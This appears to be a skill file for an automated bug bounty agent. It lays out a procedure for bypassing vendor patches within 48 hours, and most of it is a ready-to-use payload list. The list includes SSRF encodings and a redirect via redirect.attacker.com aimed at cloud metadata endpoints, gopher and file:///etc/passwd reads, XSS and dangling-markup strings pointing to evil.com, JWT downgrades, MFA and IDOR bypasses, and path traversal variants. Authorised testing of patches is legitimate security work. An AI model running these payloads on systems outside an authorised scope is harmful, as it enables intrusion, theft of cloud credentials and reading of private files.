---
context: fork
---

# Diff-Retest v1.0 — Patch Bypass Methodology Library
**Owner: cyber-operator**
**Trigger:** Finding status changes to `FIXED`/`RESOLVED` in your program index, OR manual: "retest", "patch bypass", "check if fixed", "bypass the fix", "diff retest {finding}"
**Purpose:** Systematically test patch implementations within the 48-hour bypass window — the highest ROI opportunity in bug bounty (developer patches are often incomplete, bypassed in 30-60% of cases within 48h).

---

## 48-HOUR BYPASS WINDOW LAW (ABSOLUTE)

```
RETEST WITHIN 48h OF FIX NOTIFICATION.

Why: Developers ship incremental fixes, not complete remediations.
     The bypass window closes when they do a second review cycle.
     48h = highest probability the patch is incomplete.

After 72h: bypass probability drops significantly.
After 1 week: patch typically hardened — bypass harder.

When to act: As soon as "FIXED" notification arrives in H1/Intigriti/YWH.
```

---

## TRIGGER CONDITIONS

Auto-trigger on ANY of these:

1. **Status change in your program index:** `FIXED` or `RESOLVED` status on any finding
2. **Platform notification:** "Your report has been fixed" message in H1/Intigriti/YWH
3. **Manual:** the operator says "retest [finding name]" or "check if they fixed [vector]"
4. **Retest reminder in enforcement.todo:** `RETEST_REMINDER|finding={id}|deadline={timestamp}`

---

## STEP 1 — LOAD ORIGINAL FINDING

Read the original finding from `notes/programs/{program_handle}/` folder.

Extract:
```
original_vector: [SSRF / IDOR / XSS / Auth bypass / etc.]
original_endpoint: /api/v1/...
original_payload: [exact payload that worked]
original_evidence: [what was returned / what was confirmed]
patch_description: [what H1/program says they fixed — read their comment]
```

---

## STEP 2 — ROUTE TO BYPASS TRACK

Based on `original_vector`, load the corresponding bypass track below.

---

## BYPASS TRACK A — SSRF (9 Vectors)

When original finding was SSRF.

**Understanding what was patched:** Developer likely added a blocklist (e.g., `169.254.169.254` blocked) or allowlist (only https://). Bypass the blocklist, not the check.

```
Vector 1 — IP Encoding Variants (always try first — cheapest)
  Decimal:    http://2852039166/              (169.254.169.254 in decimal)
  Octal:      http://0251.0376.0251.0376/     (leading zeros)
  Hex:        http://0xa9fea9fe/              (hex notation)
  Mixed:      http://0xa9.0xfe.0xa9.0xfe/
  IPv6:       http://[::ffff:a9fe:a9fe]/      (IPv4-mapped)
  IPv6 full:  http://[0:0:0:0:0:ffff:169.254.169.254]/

Vector 2 — DNS Rebinding
  Use: https://lock.cmpxchg8b.com/rebinder.html
  Setup: point subdomain to 169.254.169.254 via TTL=1 DNS
  Works if: server resolves DNS, checks IP, then re-requests (TOCTOU gap)

Vector 3 — Protocol Variants
  gopher://169.254.169.254:80/_GET /latest/meta-data/ HTTP/1.0
  file:///etc/passwd (for local file read bypass)
  dict://169.254.169.254:80/INFO

Vector 4 — Redirect Chain
  Setup: Host redirect.attacker.com → 301 → http://169.254.169.254/
  Payload: url=https://redirect.attacker.com/redirect
  Works if: server follows redirects after initial IP check

Vector 5 — Cloud Metadata Alternative Paths
  AWS IMDSv1:  http://169.254.169.254/latest/meta-data/
  AWS IMDSv2:  PUT http://169.254.169.254/latest/api/token first
  GCP:         http://metadata.google.internal/computeMetadata/v1/
  Azure:       http://169.254.169.254/metadata/instance?api-version=2021-01-01
  Digital Ocean: http://169.254.169.254/metadata/v1/

Vector 6 — localhost Variants
  http://127.0.0.1/          (if localhost was blocked but 127.x wasn't)
  http://127.1/              (short form)
  http://0.0.0.0/
  http://[::1]/              (IPv6 localhost)
  http://localhost.evil.com/ (SSRF via DNS — relies on server resolution)

Vector 7 — URL Parser Confusion
  http://evil.com@169.254.169.254/
  http://169.254.169.254#evil.com/
  http://evil.com:.evil.com/                (host confusion)
  http://169.254.169.254/\@evil.com/       (backslash confusion)

Vector 8 — Port-Based Bypass
  http://169.254.169.254:80/ vs :443 vs :8080 (if firewall allows some ports)
  http://169.254.169.254%09/               (tab encoding bypass)

Vector 9 — CNAME Alias
  Create: internal.attacker.com CNAME → 169.254.169.254.in-addr.arpa
  Use if DNS resolution is done client-side then validated server-side
```

---

## BYPASS TRACK B — IDOR (6 Vectors)

When original finding was IDOR / broken object-level authorization.

**Understanding what was patched:** Developer typically added ownership check on the original endpoint. Bypass the check via alternate access paths.

```
Vector 1 — HTTP Method Change
  Original: GET /api/user/123/profile
  Bypass:   POST /api/user/123/profile (same endpoint, different method)
            PUT, PATCH, HEAD, OPTIONS — try all
  Why: Auth middleware often only applied to specific HTTP methods

Vector 2 — Path Normalization
  Original: GET /api/user/123/data
  Bypass:   GET /api/user/123/../123/data    (double-traversal, same path)
            GET /api/user/%31%32%33/data     (URL-encoded ID)
            GET /api/user/123./data          (trailing dot)
            GET /api/USER/123/data           (case normalization)

Vector 3 — JSON Parameter Injection
  Original: GET /api/user/123 → 403 (ownership check added)
  Bypass:   POST /api/user/123 with body: {"user_id": 123, "owner_id": attacker_id}
            Try: {"id": [123, attacker_id]}  (array — some parsers take first item)

Vector 4 — Array Wrap
  Original: GET /api/docs?id=456 → 403
  Bypass:   GET /api/docs?id[]=456           (PHP/Laravel array notation)
            GET /api/docs?id=456&id=attacker_id (duplicate param — last-write-wins)

Vector 5 — Parameter Pollution
  GET /api/order/456?user_id=victim → POST /api/order/456?user_id=attacker&user_id=victim
  Some frameworks use first param, others use last — exploit the ambiguity

Vector 6 — Wildcard / Batch Endpoint
  Check for: /api/users/*/export, /api/orders/bulk, /api/reports/all
  If the fix was applied to individual endpoints but not batch endpoints:
    POST /api/users/bulk-export with {"ids": [123, 456, victim_id]}
```

---

## BYPASS TRACK C — XSS WAF Bypass

When original finding was XSS and WAF/filter was the patch mechanism.

**Reference:** `skills/domains/cyber/waf-bypass-engine.md` Track E (Unicode mutation engine).

```
Quick bypass checklist:
  1. Case mutation: <ScRiPt>alert(1)</ScRiPt>
  2. Attribute break: "><img src=x onerror=alert(1)>
  3. Template literal: ${alert(1)} (in JS context)
  4. SVG context: <svg/onload=alert(1)>
  5. Unicode: <script>\u0061lert(1)</script>
  6. HTML entity in attribute: onmouseover="&#97;lert(1)"
  7. Double encoding: %253Cscript%253E
  8. Dangling markup: <a href="//evil.com?
  9. CSP bypass via JSONP: ?callback=alert if CSP allows cdn.example.com
  10. DOM-only: Test JS sources (location.hash, document.referrer, postMessage)

For complex WAF: Load waf-bypass-engine.md Track A→F sequence
```

---

## BYPASS TRACK D — Auth Bypass

When original finding was authentication bypass or broken authentication.

**Reference:** `skills/domains/cyber/auth-bypass-methodology.md` (if exists).

```
Vector 1 — JWT Algorithm Downgrade
  If fix was: reject alg:none
  Bypass:     Try alg:HS256 with empty secret, weak secret ("secret", "password")
              Try alg:RS256 → HS256 (use public key as HMAC secret)

Vector 2 — Session Token Predictability
  If fix was: invalidate old tokens
  Bypass:     Generate multiple tokens → analyze entropy → check if sequential
              Try: token = base64(user_id) or MD5(username+timestamp)

Vector 3 — OAuth State Parameter
  If fix was: validate state param on callback
  Bypass:     Test state=[] (empty array), state=null, no state param at all
              CSRF via cross-origin form POST (state bypass)

Vector 4 — MFA Bypass
  If fix was: add MFA on sensitive actions
  Bypass:     Test MFA code reuse (replay within 30s window)
              Test backup codes exhaustion
              Test API endpoint that skips MFA check (/api/v2/ vs /api/v1/)

Vector 5 — Password Reset Flow
  If fix was: rate-limit reset codes
  Bypass:     Test response-based user enumeration (200 vs 404 on unknown user)
              Test reset code entropy (4-digit OTP = brute force)
              Test host header injection in reset email link

Vector 6 — CORS + Auth
  If fix was: add Authorization header requirement
  Bypass:     Test with null Origin
              Test subdomain wildcard: https://evil.{target.com} reflected?
              Test with credentials: true + wildcard — browser blocks, but check
```

---

## BYPASS TRACK E — Path Traversal / LFI

```
If fix was: strip ../
Bypass:
  ....//....//etc/passwd     (strip once → traversal remains)
  ..%2f..%2fetc%2fpasswd    (URL encode)
  %2e%2e/%2e%2e/etc/passwd  (percent encode dots)
  %252e%252e/etc/passwd      (double encode)
  ..%252f..%252fetc/passwd   (mix encode/literal)
  /etc/passwd%00.jpg         (null byte — PHP <5.3)
  ....\/....\/etc/passwd     (mixed slash)
```

---

## BYPASS TRACK F — GraphQL

```
If fix was: add auth check to field resolver
Bypass:
  Test via aliases (bypass per-field rate limiting)
  Test __type introspection (often forgotten in auth check)
  Test via persisted queries (different execution path)
  Test batch requests: [{query: "..."}] (auth may not apply to batched)
```

---

## STEP 3 — RETEST EXECUTION

For each bypass vector tried:

```
1. Reproduce original: Confirm the original vector is actually blocked
   → "Original payload returns [403/filter output]" — document this
   
2. Execute bypass: Try each vector in the track sequentially
   → Stop at first successful bypass
   
3. Confirm bypass: Same evidence standard as original finding
   → Same POC level required — behavioral difference alone is not enough
   → Must show the same data/action the original finding demonstrated
   
4. Document result:
   → SUCCESS: New EV = original × 0.85 (discount for follow-on report)
   → PARTIAL (different endpoint): New finding, full EV
   → FAILED: All vectors blocked — patch is solid
```

---

## STEP 4 — RETEST REPORT FORMAT

File under: `notes/programs/{program}/retest-{finding_id}-{date}.md`

```markdown
# Retest Report — {Finding Title}
**Program:** {program_name}
**Original Finding:** {h1_report_id or intigriti_id}
**Original Status:** FIXED (notified: {date})
**Retest Date:** {date}
**48h Window:** {within / expired}

## Patch Implementation
{What the program claimed was fixed — from their comment}

## Bypass Attempts
| Vector | Payload | Result |
|--------|---------|--------|
| IP encoding (decimal) | http://2852039166/ | BLOCKED |
| Redirect chain | http://redirect.test.com → IMDS | SUCCESS ✅ |

## Bypass Confirmed
**Type:** {Bypass vector name}
**Payload:** {exact working payload}
**Evidence:** {response / screenshot / OOB callback}

## EV Calculation
- Original EV: ${original_ev}
- Retest EV: ${retest_ev} (0.85x — follow-on discount)
- Recommendation: FILE as new report referencing original #{original_id}

## Filing Notes
Reference original report #{original_id} in the submission.
Title: "Bypass of fix for #{original_id} — SSRF via redirect chain"
```

---

## DEDUP CHECK FOR RETEST REPORTS

Before filing a bypass:
- Load `dedup-intelligence.md` — check if bypass vector was already disclosed by others
- A successful bypass filed by someone else within 48h = dup risk
- Check program's disclosed reports for "bypass" + original vector keywords

---

## PRIORITY RULES

```
1. FILE within 48h window — every hour matters
2. If multiple programs have FIXED findings: prioritize by original EV
3. Retest takes PRIORITY over new sweeps — convert confirmed past work first
4. If all bypass tracks fail: close as "Patch verified solid" in index.md
```

---

## INTEGRATION POINTS

| System | How |
|--------|-----|
| your program index | Source of FIXED findings — triggers this skill |
| waf-bypass-engine.md | Track E (Unicode mutation) for XSS bypasses |
| dedup-intelligence.md | Check before filing any bypass report |
| the EV formula | Retest EV = original × 0.85 (follow-on discount) |
| enforcement.todo | RETEST_REMINDER entries trigger this workflow |

---

*Diff-Retest v1.0 — Patch Bypass Methodology | Whitehating System v2.0 | Phase 3*
